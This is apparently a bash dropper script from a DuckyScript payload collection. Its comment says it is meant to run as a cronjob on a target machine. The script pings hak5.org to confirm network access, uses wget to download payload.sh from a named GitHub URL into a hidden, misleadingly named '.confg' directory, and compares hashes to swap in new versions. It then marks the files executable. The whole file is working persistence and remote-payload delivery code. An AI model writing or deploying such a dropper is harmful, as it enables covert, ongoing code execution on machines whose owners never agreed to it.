#!/bin/bash

# See README.md
# This is a DEMONSTRATION dropper, that will be embedded as a cronjob to pull payloads from Github (or other sources), to be executed on the target machine.

user="$(whoami)"
hash_check() {
	sha256sum /home/$user/.confg/* | awk '{print $1}'
}
hash_check_tmp() {
	sha256sum /home/$user/.confg_tmp/* | awk '{print $1}'
}

net_check() {
	ping -c1 hak5.org >/dev/null 2>&1
}

if net_check; then
	mkdir /home/$user/.confg_tmp
	wget -q -P /home/$user/.confg_tmp https://raw.githubusercontent.com/OSINTI4L/DuckyScript-Payloads/refs/heads/main/Payloads/Ducky_Dropper/payload.sh
else
	exit 0
fi

og_hash=$(hash_check)
tmp_hash=$(hash_check_tmp)
if [ "$og_hash" == "$tmp_hash" ]; then
	rm -rf /home/$user/.confg_tmp
else
	rm /home/$user/.confg/*
	mv /home/$user/.confg_tmp/* /home/$user/.confg
	rm -rf /home/$user/.confg_tmp
	chmod +x /home/$user/.confg/*
fi
